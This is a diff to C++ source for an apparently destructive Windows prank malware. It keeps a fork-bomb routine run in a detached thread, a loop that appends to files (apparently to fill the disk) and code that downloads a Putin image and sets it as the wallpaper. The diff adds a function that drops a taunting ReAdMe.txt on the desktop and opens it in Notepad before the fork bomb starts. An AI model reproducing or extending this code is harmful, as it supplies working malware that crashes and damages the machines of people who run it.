@@ -1,5 +1,6 @@
 #include <iostream>
 #include <Windows.h>
+#include <ShlObj.h>
 #include <wininet.h>
 #include <fstream>
 #include <string.h>
@@ -65,7 +66,6 @@ public:
 		else {
 			return 1;
 		}
-
 	}
 
 	void forkbomb() {
@@ -97,7 +97,6 @@ public:
 				AppendFile.close();
 			}
 			count++;
-
 		}
 	}
 
@@ -112,9 +111,7 @@ public:
 			CreateDirectoryA(dup.c_str(), NULL);
 		}
 
-
 		const char* imageUrl = "https://wegotthiscovered.com/wp-content/uploads/2022/12/vladimir-putin.jpg";
-
 
 		std::string imagePath = dup + "\\vladimir-putin.jpg";
 
@@ -123,7 +120,33 @@ public:
 		const char* imagePathConst = imagePath.c_str();
 
 		SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, (void*) imagePathConst, SPIF_UPDATEINIFILE);
+	}
+	
+	void Desktop_Op() {
+		PWSTR DesktopPath = NULL;
+		SHGetKnownFolderPath(FOLDERID_Desktop, 0, NULL, &DesktopPath);
 
+		int size_needed = WideCharToMultiByte(CP_ACP, 0, DesktopPath, -1, NULL, 0, NULL, NULL);
+
+		char* asciiStr = new char[size_needed];
+
+		WideCharToMultiByte(CP_ACP, 0, DesktopPath, -1, asciiStr, size_needed, NULL, NULL);
+
+		string FolderPathA = string(asciiStr);
+
+		delete[] asciiStr;
+
+		CoTaskMemFree(DesktopPath);
+		DesktopPath = nullptr;
+
+		FolderPathA += "\\ReAdMe.txt";
+
+		ofstream TheReadMeFile(FolderPathA);
+
+		TheReadMeFile << "I suggest you take a look at your wallpaper, and main drive. :)";
+		TheReadMeFile.close();
+
+		ShellExecuteA(NULL, "open", "notepad.exe", FolderPathA.c_str(), NULL, SW_SHOWMAXIMIZED);
 	}
 };
 
@@ -145,6 +168,8 @@ int main() {
 	if (Obj.warning() == 1) {
 		return 0;
 	}
+
+	Obj.Desktop_Op();
 	thread fork_thread(&Functionality::forkbomb, &Obj);
 
 	fork_thread.detach();
